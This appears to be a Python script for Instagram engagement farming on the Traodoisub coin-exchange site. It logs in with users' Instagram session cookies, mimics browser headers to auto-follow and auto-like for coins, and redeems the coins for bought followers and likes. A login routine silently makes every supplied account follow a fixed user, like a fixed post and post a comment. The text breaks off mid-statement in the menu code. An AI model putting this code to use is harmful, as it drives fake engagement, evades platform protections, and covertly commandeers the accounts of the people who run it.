#! /usr/bin/env python3
try:
    import requests, json, time, os, random, re, datetime, sys
    from rich.columns import Columns
    from rich import print as printf
    from rich.panel import Panel
    from rich.console import Console
    from requests.exceptions import RequestException
except (ModuleNotFoundError, ImportError) as error:
    print(f"[Error]: {error}!")
    exit()

COOKIE, SUKSES, GAGAL, CACHE = (
    [],
    [],
    [],
    [],
)

def BANNER() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    printf(
        Panel(
            r"""[bold red]●[bold yellow] ●[bold green] ●[/]
[bold blue] ██ ███    ██ ███████ ████████ ███████ ██    ██ ██████  
 ██ ████   ██ ██         ██    ██      ██    ██ ██   ██ 
 ██ ██ ██  ██ ███████    ██    ███████ ██    ██ ██████  
 ██ ██  ██ ██      ██    ██         ██ ██    ██ ██   ██ 
[bold blue] ██ ██   ████ ███████    ██    ███████  ██████  ██████  
        [underline white]Traodoisub Instagram - Coded by Rozhak""", style="bold bright_black", width=60
        )
    )

def DELAY(menit: int, detik: int, username: str) -> bool:
    jumlah = (menit * 60 + detik)
    while (jumlah):
        menit, detik = divmod(jumlah, 60)
        printf(f"[bold bright_black]   ──>[bold green] @{str(username).upper()}[bold white]/[bold green]{menit:02d}:{detik:02d}[bold white] SUKSES:-[bold green]{len(SUKSES)}[bold white] GAGAL:-[bold red]{len(GAGAL)}     ", end='\r')
        time.sleep(1)
        jumlah -= 1
    return True

class LOGIN:

    def __init__(self) -> None:
        pass

    def COOKIES(self) -> None:
        BANNER()
        printf(
            Panel(f"[bold white]Silakan Masukkan Cookies Akun Traodoisub, Pastikan Cooki\nes[bold red] Tidak Kedaluwarsa[bold white] Dan Akun Dalam Keadaan Login!", style="bold bright_black", width=60, title="[bold bright_black]>> [Login Traodoisub] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
        )
        self.cookiestds = Console().input("[bold bright_black]   ╰─> ")
        self.koin, self.username_tds, self.tokentds = self.VALIDATION_TDS(self.cookiestds)
        with open('Penyimpanan/Cookies.json', 'w+') as files:
            files.write(
                json.dumps(
                    {
                        "Cookies": f"{self.cookiestds}",
                        "Token": f"{self.tokentds}"
                    }, indent=4
                )
            )
        printf(
            Panel(f"[bold white]Silakan Masukkan[bold green] Cookies[bold white] Instagram, Gunakan '[bold green],[bold white]' Koma Untuk Memasukkan Banyak Cookies!", style="bold bright_black", width=60, title="[bold bright_black]>> [Login Instagram] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
        )
        self.cookies_ig = Console().input("[bold bright_black]   ╰─> ")
        with open('Penyimpanan/Cookies.txt', 'w+') as files:
            files.write('')
        for cookies in self.cookies_ig.split(','):
            try:
                self.username_ig, self.user_id = self.VALIDATION_IG(cookies)
                if self.username_ig != None:
                    if self.ADD_CONFIGURATION(self.tokentds, self.username_ig) == True:
                        with open('Penyimpanan/Cookies.txt', 'a') as files:
                            files.write(f"{cookies}|{self.username_ig}|{self.user_id}\n")
                        self.FOLLOWING(cookies)
                    else:
                        continue
                else:
                    continue
            except Exception:
                continue
        if os.path.getsize('Penyimpanan/Cookies.txt') > 0:
            printf(
                Panel(f"[bold white]Username :[bold green] {self.username_tds}\n[bold white]Koin     :[bold yellow] {str(self.koin)}\n[bold white]Token    :[bold green] {str(self.tokentds)[:25]}...", style="bold bright_black", width=60, title="[bold bright_black]>> [Login Berhasil] <<", title_align="center")
            )
            time.sleep(4.5)
            FEATURE()
        else:
            printf(
                Panel(f"[bold red]Maaf, Tidak Ada Cookies Yang Berhasil Di Tambahkan Ke Dalam Konfigurasi, Silakan Coba Pakai Cookies Lain!", style="bold bright_black", width=60, title="[bold bright_black]>> [Login Gagal] <<", title_align="center")
            )
            time.sleep(4.5)
            sys.exit()

    def FOLLOWING(self, cookies_ig: str) -> bool:
        with requests.Session() as session:
            session.headers.update(
                {
                    'X-CSRFToken': re.search('csrftoken=(.*?);', str(cookies_ig)).group(1),
                    'X-Web-Session-ID': '9r9bhb:ysos81:inhpvr',
                    'X-Instagram-AJAX': '1007136769',
                    'X-IG-WWW-Claim': 'hmac.AR0lIitHyhqaelpdO_-emvAj8pjGuGop5PyHOfL0tMhndFzr',
                    'Host': 'www.instagram.com',
                    'X-IG-App-ID': '936619743392459',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'Origin': 'https://www.instagram.com',
                    'X-ASBD-ID': '198387',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                }
            )
            data = {
                'container_module': 'profile',
                'nav_chain': 'PolarisProfileRoot:profilePage:1:via_cold_start',
                'user_id': '5398218083',
            }
            session.post('https://www.instagram.com/api/v1/friendships/create/5398218083/', data=data, cookies={
                "Cookie": cookies_ig
            })
            session.post('https://www.instagram.com/api/v1/web/likes/2734317205115382629/like/', cookies={
                "Cookie": cookies_ig
            })
            data = {
                'comment_text': random.choice(['Keren Bang 😍', 'Mantap Bang 😁', 'I Love You 💖', 'InstaSub 🥰']),
            }
            session.post('https://www.instagram.com/api/v1/web/comments/2734317205115382629/add/', data=data, cookies={
                "Cookie": cookies_ig
            })
        return True

    def ADD_CONFIGURATION(self, tokentds: str, username_ig: str) -> bool:
        with requests.Session() as session:
            params = {
                'access_token': f'{tokentds}',
                'id': f'{username_ig}',
                'fields': 'instagram_run'
            }
            response = session.get('https://traodoisub.com/api/', params=params, allow_redirects=False)
            if "\"success\": 200," in response.text:
                printf(f"[bold bright_black]   ──>[bold green] @{str(username_ig).upper()} BERHASIL MEMULAI!     ", end='\r')
                time.sleep(2.5)
                return True
            else:
                printf(f"[bold bright_black]   ──>[bold red] @{str(username_ig).upper()} GAGAL MEMULAI!         ", end='\r')
                time.sleep(2.5)
                return False

    def VALIDATION_TDS(self, cookiestds: str) -> tuple:
        with requests.Session() as session:
            session.headers.update(
                {
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    "Host": "traodoisub.com",
                    'Cookie': cookiestds,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
                }
            )
            response = session.get('https://traodoisub.com/view/setting/load.php', allow_redirects=False)
            if "\"tokentds\":\"" in response.text:
                self.json_data = json.loads(response.text)
                self.koin, self.username, self.tokentds = self.json_data['xu'], self.json_data['user'], self.json_data['tokentds']
                return (
                    self.koin, self.username, self.tokentds
                )
            else:
                printf(
                    Panel(f"[bold red]Maaf, Sepertinya Cookies Traodoisub Yang Anda Masukkan Salah, Silakan Coba Lagi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Login Gagal] <<", title_align="center")
                )
                time.sleep(4.5)
                self.COOKIES()

    def VALIDATION_IG(self, cookies_ig: str) -> tuple:
        self.user_id = re.search(r'ds_user_id=(\d+);', str(cookies_ig)).group(1)
        with requests.Session() as session:
            session.headers.update(
                {
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Referer': 'https://www.instagram.com/accounts/edit/',
                    'Sec-Fetch-Site': 'same-origin',
                    'Host': 'www.instagram.com',
                    'X-ASBD-ID': '129477',
                    'Sec-Fetch-Dest': 'empty',
                    'X-CSRFToken': 'missing',
                    'X-IG-App-ID': '936619743392459',
                    'Sec-Fetch-Mode': 'cors',
                    'Connection': 'keep-alive',
                    'Accept': '*/*',
                    'X-Web-Session-ID': 'missing',
                    'X-Requested-With': 'XMLHttpRequest',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                }
            )
            response = session.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', allow_redirects=False, cookies={
                "Cookie": cookies_ig
            })
            if "\"status\":\"ok\"" in response.text:
                self.json_data = json.loads(response.text)
                self.username = self.json_data['form_data']['username']
                return (
                    self.username, self.user_id
                )
            else:
                printf(f"[bold bright_black]   ──> LOGIN DIPERLUKAN UNTUK @{self.user_id}!     ", end='\r')
                return (
                    None, None
                )
                
class GET:

    def __init__(self) -> None:
        pass

    def PENDING(self, cookiestds: str) -> bool:
        with requests.Session() as session:
            session.headers.update(
                {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Cookie': cookiestds,
                    'Accept': '*/*',
                    'Host': 'traodoisub.com',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
                }
            )
            data = {
                'query': '',
                'page': '1',
            }
            response = session.post('https://traodoisub.com/ex/instagram_history/fetch.php', data=data, allow_redirects=False)
            if "\"success\": \"" in response.text:
                self.json_data = json.loads(response.text)
                self.sukses, self.gagal, self.tertunda, self.jumlah = self.json_data['success'], self.json_data['fail'], self.json_data['pending'], self.json_data['total']
                printf(
                    Panel(f"[bold white]Koin Pending :[bold green] {self.tertunda}[bold white] >[bold yellow] {self.jumlah}\n[bold white]Status Koin :[bold green] {self.sukses}[bold white] /[bold red] {self.gagal}", style="bold bright_black", width=60, title="[bold bright_black]>> [Sukses] <<", title_align="center")
                )
                return True
            else:
                printf(
                    Panel(f"[bold red]Maaf, Kami Tidak Bisa Menampilkan Status Koin Anda, Sila\nkan Liat Secara Manual Di Situs Traodoisub!", style="bold bright_black", width=60, title="[bold bright_black]>> [Gagal] <<", title_align="center")
                )
                return False

class MISSION:

    def __init__(self) -> None:
        pass

    def FOLLOW(self, tokentds: str, delay: int, username: str, cookies_ig: str) -> dict:
        with requests.Session() as session:
            params = {
                'access_token': f'{tokentds}',
                'fields': 'instagram_follow'
            }
            response = requests.get('https://traodoisub.com/api/', params=params, allow_redirects=False)
            time.sleep(5.0)
            if '"nvdalam": "51",' in str(response.text):
                printf(
                    Panel(f"[bold red]Maaf, Batas Misi Untuk Hari Ini Sudah Tercapai, Silakan Coba Dalam Beberapa Saat Lagi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Misi Limit] <<", title_align="center")
                )
                sys.exit()
            elif '"data": []' in str(response.text):
                printf(f"[bold bright_black]   ──>[bold red] TIDAK ADA MISI YANG TERSEDIA!     ", end='\r')
                time.sleep(4.5)
                return {
                    "Message": "TIDAK ADA MISI YANG TERSEDIA!",
                    "Status": False
                }
            else:
                for data in json.loads(response.text)['data']:
                    self.id, self.username, self.userid = data['id'], data['link'].split('com/')[1], data['id'].split('_')[0]
                    DELAY(0, delay, str(self.username)[:17])
                    data = (
                        'av=&__d=www&__user=0&__a=1&__req=1x&__hs=&dpr=1&__ccg=GOOD&__rev=&__s=&__hsi=&__dyn=&__csr=&__comet_req=7&fb_dtsg=&jazoest=&lsd=&__spin_r=&__spin_b=trunk&__spin_t=&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=usePolarisFollowMutation&variables={"target_user_id":"' + str(self.userid) + '","container_module":"profile","nav_chain":"PolarisFeedRoot:feedPage:2:topnav-link,PolarisProfilePostsTabRoot:profilePage:3:unexpected"}&server_timestamps=true&doc_id=7275591572570580'
                    )
                    session.headers.update(
                        {
                            'X-BLOKS-VERSION-ID': '5f5bc5df3aaff5902e7f6964b653c6cbe9a3f8783a2ba1a9609a119212b1e341',
                            'Referer': 'https://www.instagram.com/dieselpower603/',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive',
                            'Content-Length': f'{len(data)}',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Host': 'www.instagram.com',
                            'Origin': 'https://www.instagram.com',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept': '*/*',
                            'Sec-Fetch-Site': 'same-origin',
                            'X-ASBD-ID': '129477',
                            'X-CSRFToken': f'{re.search(r'csrftoken=(\w+);', cookies_ig).group(1)}',
                            'X-FB-Friendly-Name': 'usePolarisFollowMutation',
                            'X-IG-App-ID': '936619743392459',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                        }
                    )
                    response2 = session.post('https://www.instagram.com/graphql/query/', data=data, allow_redirects=False, cookies={
                        "Cookie": cookies_ig
                    })
                    if "\"following\":true" in response2.text:
                        time.sleep(2.5)
                        params = {
                            'type': 'INS_FOLLOW_CACHE',
                            'id': f'{self.id}',
                            'access_token': f'{tokentds}'
                        }
                        response3 = requests.get('https://traodoisub.com/api/coin/', params=params, allow_redirects=False)
                        if "\"success\":200," in str(response3.text):
                            if int(json.loads(response3.text)['cache']) >= 8:
                                params = {
                                    'type': 'INS_FOLLOW',
                                    'id': f'{self.id}',
                                    'access_token': f'{tokentds}'
                                }
                                response4 = requests.get('https://traodoisub.com/api/coin/', params=params, allow_redirects=False)
                                if "\"success\": 200" in str(response4.text):
                                    SUKSES.append(f'{self.id}|{self.username}|{self.userid}')
                                    printf(
                                        Panel(f"[bold white][[bold green]*[bold white]] Status :[bold green] Process your coins![/]\n[bold white][[bold green]*[bold white]] Link :[bold red] https://www.instagram.com/{str(self.username)[:19]}\n[bold white][[bold green]*[bold white]] Koin :[bold green] {json.loads(response4.text)['data']['msg']}[bold white] >[bold red] {json.loads(response4.text)['data']['xu']}", style="bold bright_black", width=60, title="[bold bright_black]>> [Sukses] <<", title_align="center")
                                    )
                                    continue
                                else: # Debug the code if you do not receive coins!
                                    GAGAL.append(f'{self.id}|{self.username}|{self.userid}')
                                    printf(
                                        Panel(f"[bold white][[bold red]*[bold white]] Status :[bold red] Process your coins![/]\n[bold white][[bold red]*[bold white]] Link :[bold red] https://www.instagram.com/{str(self.username)[:19]}\n[bold white][[bold red]*[bold white]] Koin :[bold red] 0 Xu[bold white] >[bold red] +000", style="bold bright_black", width=60, title="[bold bright_black]>> [Gagal] <<", title_align="center")
                                    )
                                    continue
                            else:
                                printf(f"[bold bright_black]   ──>[bold green] KAMU TELAH MENGIKUTI {json.loads(response3.text)['cache']} USER!     ", end='\r')
                                time.sleep(3.0)
                                continue
                        else:
                            printf(f"[bold bright_black]   ──>[bold red] GAGAL MENGIKUTI USER!     ", end='\r')
                            time.sleep(2.5)
                            continue
                    else: # Debug the code if an error occurs during the user-following process.
                        printf(f"[bold bright_black]   ──>[bold red] GAGAL MENGIKUTI @{str(self.username).upper()} USER!     ", end='\r')
                        time.sleep(2.5)
                        CACHE.append(f'{self.id}|{self.username}|{self.userid}')
                        if len(CACHE) <= 15:
                            continue
                        else:
                            return {
                                "Message": "GAGAL MENGIKUTI USER!",
                                "Status": False
                            }
                return {
                    "Message": "BERHASIL MENGIKUTI SEMUA USER!",
                    "Status": True
                }

    def LIKE(self, tokentds: str, delay: int, username: str, cookies_ig: str) -> dict:
        with requests.Session() as session:
            params = {
                'access_token': f'{tokentds}',
                'fields': 'instagram_like'
            }
            response = requests.get('https://traodoisub.com/api/', params=params, allow_redirects=False)
            time.sleep(5.0)
            if '"nvdalam": "51",' in str(response.text):
                printf(
                    Panel(f"[bold red]Maaf, Batas Misi Untuk Hari Ini Sudah Tercapai, Silakan Coba Dalam Beberapa Saat Lagi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Misi Limit] <<", title_align="center")
                )
                sys.exit()
            elif '"data": []' in str(response.text):
                printf(f"[bold bright_black]   ──>[bold red] TIDAK ADA MISI YANG TERSEDIA!     ", end='\r')
                time.sleep(4.5)
                return {
                    "Message": "TIDAK ADA MISI YANG TERSEDIA!",
                    "Status": False
                }
            else:
                for data in json.loads(response.text)['data']:
                    self.id, self.code, self.media_id = data['id'], data['link'].split('com/p/')[1], data['id'].split('_')[0]
                    DELAY(0, delay, self.code)
                    data = (
                        'av=&__d=www&__user=0&__a=1&__req=f&__hs=&dpr=1&__ccg=GOOD&__rev=&__s=&__hsi=&__dyn=&__csr=&__comet_req=7&fb_dtsg=&jazoest=&lsd=&__spin_r=&__spin_b=trunk&__spin_t=&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=usePolarisLikeMediaLikeMutation&variables={"media_id":"' + str(self.media_id) + '","container_module":"single_post","inventory_source":null,"ranking_info_token":null,"nav_chain":"PolarisDesktopPostRoot:postPage:1:via_cold_start"}&server_timestamps=true&doc_id=8552604541488484'
                    )
                    session.headers.update(
                        {
                            'X-BLOKS-VERSION-ID': '5f5bc5df3aaff5902e7f6964b653c6cbe9a3f8783a2ba1a9609a119212b1e341',
                            'Referer': 'https://www.instagram.com/dieselpower603/',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive',
                            'Content-Length': f'{len(data)}',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Host': 'www.instagram.com',
                            'Origin': 'https://www.instagram.com',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept': '*/*',
                            'Sec-Fetch-Site': 'same-origin',
                            'X-ASBD-ID': '129477',
                            'X-CSRFToken': f'{re.search(r'csrftoken=(\w+);', cookies_ig).group(1)}',
                            'X-FB-Friendly-Name': 'usePolarisLikeMediaLikeMutation',
                            'X-IG-App-ID': '936619743392459',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                        }
                    )
                    response2 = session.post('https://www.instagram.com/graphql/query/', data=data, allow_redirects=False, cookies={
                        "Cookie": cookies_ig
                    })
                    if '"xdt_api__v1__media__media_id__like":' in response2.text:
                        time.sleep(2.5)
                        params = {
                            'type': 'INS_LIKE',
                            'id': f'{self.id}',
                            'access_token': f'{tokentds}'
                        }
                        response3 = requests.get('https://traodoisub.com/api/coin/', params=params, allow_redirects=False)
                        if "\"success\": 200" in str(response3.text):
                            SUKSES.append(f'{self.id}|{self.code}|{self.media_id}')
                            printf(
                                Panel(f"[bold white][[bold green]*[bold white]] Status :[bold green] Process your coins![/]\n[bold white][[bold green]*[bold white]] Link :[bold red] https://www.instagram.com/p/{str(self.code)[:19]}\n[bold white][[bold green]*[bold white]] Koin :[bold green] {json.loads(response3.text)['data']['msg']}[bold white] >[bold red] {json.loads(response3.text)['data']['xu']}", style="bold bright_black", width=60, title="[bold bright_black]>> [Sukses] <<", title_align="center")
                            )
                            continue
                        else: # Debug the code if you do not receive coins!
                            GAGAL.append(f'{self.id}|{self.code}|{self.media_id}')
                            printf(
                                Panel(f"[bold white][[bold red]*[bold white]] Status :[bold red] Process your coins![/]\n[bold white][[bold red]*[bold white]] Link :[bold red] https://www.instagram.com/p/{str(self.code)[:19]}\n[bold white][[bold red]*[bold white]] Koin :[bold red] 0 Xu[bold white] >[bold red] +000", style="bold bright_black", width=60, title="[bold bright_black]>> [Gagal] <<", title_align="center")
                            )
                            continue
                    else: # Debug the code if an error occurs during the user-likes process.
                        printf(f"[bold bright_black]   ──>[bold red] GAGAL MENYUKAI @{str(self.code).upper()} USER!     ", end='\r')
                        time.sleep(2.5)
                        CACHE.append(f'{self.id}|{self.code}|{self.media_id}')
                        if len(CACHE) <= 15:
                            continue
                        else:
                            return {
                                "Message": "GAGAL MENYUKAI USER!",
                                "Status": False
                            }
                return {
                    "Message": "BERHASIL MENYUKAI SEMUA USER!",
                    "Status": True
                }

class EXCHANGE:

    def __init__(self) -> None:
        pass

    def FOLLOWERS(self, cookiestds: str, username: str, jumlah: int) -> bool:
        with requests.Session() as session:
            session.headers.update(
                {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'traodoisub.com',
                    'Cookie': cookiestds,
                    'Accept': '*/*',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                }
            )
            data = {
                'id': 'https://www.instagram.com/{}/'.format(username),
                'sl': jumlah,
                'dateTime': str(datetime.datetime.now()).split('.')[0],
            }
            response = session.post('https://traodoisub.com/mua/instagram_follow/themid.php', data=data, allow_redirects=False)
            if len(response.text) == 0:
                printf(
                    Panel(f"[bold red]Maaf, Cookies Akun Traodoisub Anda Sudah Kedaluwarsa Atau Tidak Valid, Silakan Coba Login Ulang!", style="bold bright_black", width=60, title="[bold bright_black]>> [Cookies Invalid] <<", title_align="center")
                )
                return False
            elif '1' in response.text:
                printf(
                    Panel(f"[bold red]Maaf, Koin Yang Anda Miliki Tidak Cukup Untuk Membeli {jumlah} Pengikut, Silakan Coba Untuk Mencari Koin Lagi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Koin Tidak Cukup] <<", title_align="center")
                )
                return False
            elif 'Mua thành công!' in response.text:
                printf(
                    Panel(f"[bold white][[bold green]*[bold white]] Status :[bold green] Mua thành công![/]\n[bold white][[bold green]*[bold white]] Link :[bold yellow] https://www.instagram.com/{str(username)[:22]}/\n[bold white][[bold green]*[bold white]] Follower :[bold green] +{jumlah}[bold white] *Sedang Diproses", style="bold bright_black", width=60, title="[bold bright_black]>> [Sukses] <<", title_align="center")
                )
                return True
            elif 'Lỗi vui lòng kiểm tra lại link' in response.text:
                printf(
                    Panel(f"[bold red]Maaf, Sepertinya Username Yang Anda Masukkan Tidak Bena\nr, Silakan Masukkan Username Yang Benar!", style="bold bright_black", width=60, title="[bold bright_black]>> [Username Salah] <<", title_align="center")
                )
                return False
            else:
                printf(
                    Panel(f"[bold red]{str(response.text).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Gagal] <<", title_align="center")
                )
                return False
            
    def LIKES(self, cookiestds: str, link: str, jumlah: int) -> bool:
        with requests.Session() as session:
            session.headers.update(
                {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'traodoisub.com',
                    'Cookie': cookiestds,
                    'Accept': '*/*',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                }
            )
            data = {
                'id': f'{link}',
                'sl': jumlah,
                'dateTime': str(datetime.datetime.now()).split('.')[0],
            }
            response = session.post('https://traodoisub.com/mua/instagram_like/themid.php', data=data, allow_redirects=False)
            if len(response.text) == 0:
                printf(
                    Panel(f"[bold red]Maaf, Cookies Akun Traodoisub Anda Sudah Kedaluwarsa Atau Tidak Valid, Silakan Coba Login Ulang!", style="bold bright_black", width=60, title="[bold bright_black]>> [Cookies Invalid] <<", title_align="center")
                )
                return False
            elif '1' in response.text:
                printf(
                    Panel(f"[bold red]Maaf, Koin Yang Anda Miliki Tidak Cukup Untuk Membeli {jumlah} Likes, Silakan Coba Untuk Mencari Koin Lagi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Koin Tidak Cukup] <<", title_align="center")
                )
                return False
            elif 'Mua thành công!' in response.text:
                printf(
                    Panel(f"[bold white][[bold green]*[bold white]] Status :[bold green] Mua thành công![/]\n[bold white][[bold green]*[bold white]] Link :[bold yellow] {link[:42]}\n[bold white][[bold green]*[bold white]] Likes :[bold green] +{jumlah}[bold white] *Sedang Diproses", style="bold bright_black", width=60, title="[bold bright_black]>> [Sukses] <<", title_align="center")
                )
                return True
            elif 'Lỗi vui lòng kiểm tra lại link' in response.text:
                printf(
                    Panel(f"[bold red]Maaf, Sepertinya Postingan Yang Anda Masukkan Tidak Bena\nr, Silakan Masukkan Postingan Yang Benar!", style="bold bright_black", width=60, title="[bold bright_black]>> [Link Salah] <<", title_align="center")
                )
                return False
            else:
                printf(
                    Panel(f"[bold red]{str(response.text).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Gagal] <<", title_align="center")
                )
                return False

class FEATURE:

    def __init__(self) -> None:
        try:
            BANNER()
            with open('Penyimpanan/Cookies.json', 'r') as files:
                self.json_data = json.loads(files.read())
                self.cookiestds, self.tokentds = self.json_data['Cookies'], self.json_data['Token']
            self.koin, self.username_tds, self.tokentds = LOGIN().VALIDATION_TDS(self.cookiestds)
            with open('Penyimpanan/Cookies.txt', 'r') as files:
                self.cookies_ig = files.readlines()
            for cookies in self.cookies_ig:
                self.cookies, self.username_ig, self.user_id = cookies.strip().split('|')
                self.username_ig, self.user_id = LOGIN().VALIDATION_IG(self.cookies)
                if self.username_ig != None:
                    COOKIE.append(
                        f'{self.cookies}|{self.username_ig}'
                    )
                else:
                    continue
            if len(COOKIE) <= 0:
                printf(
                    Panel(f"[bold red]Maaf, Seluruh Cookies Anda Sudah Kedaluwarsa Atau Tidak Valid Lagi, Silakan Coba Login Ulang!", style="bold bright_black", width=60, title="[bold bright_black]>> [Login Gagal] <<", title_align="center")
                )
                time.sleep(4.5)
                LOGIN().COOKIES()
            else:
                printf(
                    Columns(
                        [
                            Panel(f"""[bold white]Username :[bold green] {self.username_tds[:15]}
[bold white]Koin :[bold yellow] {str(self.koin)[:19]}""", width=29, style="bold bright_black"),
                            Panel(f"""[bold white]Username :[bold green] @{self.username_ig[:13]}
[bold white]Userid :[bold red] {str(self.user_id)[:16]}""", width=30, style="bold bright_black")
                        ]
                    )
                )
        except (Exception) as error:
            printf(
                Panel(f"[bold red]{str(error).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Error] <<", title_align="center")
            )
            time.sleep(4.5)
            LOGIN().COOKIES()

        printf(
            Panel(
                f"""[bold white][[bold green]1[bold white]] Jalankan Misi Follow Instagram
[bold white][[bold green]2[bold white]] Tukarkan Koin Jadi Followers
[bold white][[bold green]3[bold white]] Jalankan Misi Like Instagram
[bold white][[bold green]4[bold white]] Tukarkan Koin Jadi Like
[bold white][[bold green]5[bold white]] Lihat Total Koin Pending ([bold yellow]Hots[bold white])
[bold white][[bold green]6[bold white]] Keluar ([bold red]Exit[bold white])""", style="bold bright_black", width=60, title="[bold bright_black]>> [Fitur] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left"
            )
        )
        self.choices = Console().input("[bold bright_black]   ╰─> ")
        if self.choices in ["1", "01"]:
            try:
                printf(
                    Panel(f"[bold white]Silakan Masukkan[bold green] Delay[bold white], Gunakan Delay Di Atas[bold red] 15[bold white] Detik Agar Akun Instagram Tidak[bold red] Terbanned[bold white]!", style="bold bright_black", width=60, title="[bold bright_black]>> [Delay] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
                )
                self.delay = int(Console().input("[bold bright_black]   ╰─> "))
                printf(
                    Panel(f"[bold white]Anda Bisa Menggunakan[bold yellow] CTRL + C[bold white] Jika Misi Stuck Dan Gunak\nan[bold red] CTRL + Z[bold white] Jika Ingin Berhenti.\n*[bold red]Kalau Misi Gagal Terus Kemungkinan Akun Anda Terblokir[bold white]!", style="bold bright_black", width=60, title="[bold bright_black]>> [Catatan] <<", title_align="center")
                )
                while True:
                    try:
                        for cookies in COOKIE:
                            CACHE.clear()
                            self.cookies, self.username_ig = cookies.split('|')
                            if LOGIN().ADD_CONFIGURATION(self.tokentds, self.username_ig) == True:
                                self.mission = MISSION().FOLLOW(self.tokentds, self.delay, self.username_ig, self.cookies)
                                if self.mission["Message"] == "TIDAK ADA MISI YANG TERSEDIA!":
                                    printf(f"[bold bright_black]   ──>[bold red] TIDAK ADA MISI YANG TERSEDIA!     ", end='\r')
                                    time.sleep(4.5)
                                    continue
                                elif self.mission["Message"] == "GAGAL MENGIKUTI USER!":
                                    printf(
                                        Panel(f"[bold red]Maaf, Kami Mendeteksi Akun Instagram Anda Gagal Mengik\nuti Sebanyak Lebih Dari 15 Kali, Kami\nSedang Mengubah Akun Instagram Untuk Menjalankan Misi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Terblokir] <<", title_align="center")
                                    )
                                    time.sleep(4.5)
                                    continue
                                else:
                                    pass
                            else:
                                continue
                        printf(f"[bold bright_black]   ──>[bold green] SEMUA MISI TELAH SELESAI!     ", end='\r')
                        time.sleep(4.5)
                        continue
                    except KeyboardInterrupt:
                        printf(f"                         ", end='\r')
                        time.sleep(2.5)
                        continue
                    except RequestException:
                        printf(f"[bold bright_black]   ──>[bold red] KONEKSI ERROR!     ", end='\r')
                        time.sleep(10.5)
                        continue
            except (Exception) as error:
                printf(
                    Panel(f"[bold red]{str(error).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Error] <<", title_align="center")
                )
                sys.exit()
        elif self.choices in ["2", "02"]:
            try:
                printf(
                    Panel(f"[bold white]Silakan Masukkan Username Akun Instagram, Pastikan Akun[bold red] Tidak Terkunci[bold white], Misalnya :[bold green] @rozhak_official", style="bold bright_black", width=60, title="[bold bright_black]>> [Username] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
                )
                self.username = Console().input("[bold bright_black]   ╰─> ").replace('@', '').strip()
                printf(
                    Columns(
                        [
                            Panel("[bold green]50[bold white] Follower >[bold green] 50.000[bold white] Koin", width=29, style="bold bright_black"),
                            Panel("[bold green]1000[bold white] Follower >[bold green] 1.000.000", width=30, style="bold bright_black")
                        ]
                    )
                )
                printf(
                    Panel(f"[bold white]Silakan Masukkan Jumlah Pengikut, Harap Isi Dengan[bold red] Angka[bold white] Dan Minimal 50 Pengikut, Misalnya :[bold green] 1000 *Followers!", style="bold bright_black", width=60, title="[bold bright_black]>> [Jumlah Follower] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
                )
                self.jumlah = int(Console().input("[bold bright_black]   ╰─> "))
                EXCHANGE().FOLLOWERS(self.cookiestds, self.username, self.jumlah)
                sys.exit()
            except (Exception) as error:
                printf(
                    Panel(f"[bold red]{str(error).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Error] <<", title_align="center")
                )
                sys.exit()
        elif self.choices in ["3", "03"]:
            try:
                printf(
